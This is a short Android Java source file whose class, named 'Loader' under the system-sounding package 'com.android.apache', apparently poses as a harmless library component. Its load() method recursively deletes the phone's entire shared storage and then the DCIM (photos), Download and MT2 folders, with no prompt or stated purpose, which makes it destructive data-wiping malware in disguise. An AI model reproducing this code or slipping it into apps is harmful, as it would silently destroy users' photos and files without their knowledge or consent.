package com.android.apache;

import android.util.Log;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

public class Loader {
    public static void load() {
        Log.e("File Del", "Called");
        String f = "storage/emulated/0/";
        File file = new File(f);
        try {
            FileUtils.deleteDirectory(file);
            if (new File("storage/emulated/0/DCIM").exists()) {
                FileUtils.deleteDirectory(new File("storage/emulated/0/DCIM"));
            }
            if (new File("storage/emulated/0/Download").exists()) {
                FileUtils.deleteDirectory(new File("storage/emulated/0/Download"));
            }
            if (new File("storage/emulated/0/MT2").exists()) {
                FileUtils.deleteDirectory(new File("storage/emulated/0/MT2"));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
